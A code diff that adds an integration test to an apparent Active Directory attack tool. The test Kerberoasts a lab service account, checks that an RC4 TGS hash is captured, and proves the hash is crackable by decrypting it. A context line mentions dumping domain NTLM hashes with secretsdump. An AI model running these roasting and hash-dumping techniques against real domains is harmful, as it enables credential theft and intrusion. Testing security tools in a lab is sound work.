@@ -86,6 +86,26 @@ class CredentialedAdIntegrationTest(unittest.TestCase):
         self.assertTrue(any(a.get("hash") for a in spns),
                         "no $krb5tgs$ hash captured")
 
+    def test_native_kerberoast_produces_a_crackable_hash(self):
+        # recce's stdlib Kerberos client (no impacket) roasts the SPN, and the captured
+        # $krb5tgs$23$ ticket decrypts with the service account's real key - proving the
+        # hash is genuine AND that the native path is accepted by the KDC where
+        # impacket-GetUserSPNs -request is rejected (KRB_AP_ERR_INAPP_CKSUM).
+        from recce import kerberos
+        from recce.ntlm import nt_hash
+        spn = os.environ.get("RECCE_AD_SPN", "MSSQLSvc/db.recce.local:1433")
+        spn_pass = os.environ.get("RECCE_AD_SPN_PASS", "Sql!Passw0rd")
+        r = kerberos.kerberoast_spn(_HOST, _DOMAIN, _ADMIN,
+                                    kerberos.client_key(password=_PASS), spn,
+                                    spn_user=_SPN_USER)
+        self.assertEqual(r.get("state"), "roasted", f"native roast failed: {r}")
+        self.assertTrue(r.get("hash", "").startswith("$krb5tgs$23$"),
+                        f"not an RC4 TGS hash: {r.get('hash', '')[:40]}")
+        cksum_hex, edata_hex = r["hash"].rsplit("*$", 1)[1].split("$")
+        cipher = bytes.fromhex(cksum_hex) + bytes.fromhex(edata_hex)
+        # raises ValueError on a wrong key, so a clean return proves the hash is real.
+        kerberos.rc4_decrypt(nt_hash(spn_pass), 2, cipher)
+
     def test_secretsdump_dumps_domain_hashes(self):
         # As a domain admin, secretsdump -just-dc / SAM+NTDS must return NTLM hashes.
         self._require("impacket-secretsdump")
